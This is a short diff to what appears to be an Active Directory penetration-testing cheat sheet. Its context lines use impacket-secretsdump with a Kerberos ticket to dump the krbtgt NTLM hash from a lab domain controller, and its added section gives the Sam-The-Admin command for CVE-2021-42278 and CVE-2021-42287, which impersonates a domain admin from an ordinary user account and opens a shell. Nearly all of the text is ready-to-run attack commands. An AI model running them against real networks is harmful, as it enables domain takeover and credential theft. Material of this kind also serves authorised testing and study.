@@ -20,3 +20,9 @@ cp emacron.ccache /tmp/
 export KRB5CCNAME=/tmp/emacron.ccache
 impacket-secretsdump -user-status -just-dc-ntlm -just-dc-user krbtgt 'crashlab.local/emacron@crashdc.crashlab.local' -k -no-pass -dc-ip 10.100.10.12 -target-ip 10.100.10.12 
 ```
+
+## CVE-2021-42278 & CVE-2021-42287 : Sam-The-Admin
+Impersonate DA from standard domain user. Based on https://github.com/WazeHell/sam-the-admin
+```bash
+python3 sam_the_admin.py -domain-netbios NETBIOS_NAME -dc-ip IP_DC -shell 'DOMAIN/USERNAME:PASSWORD'
+```
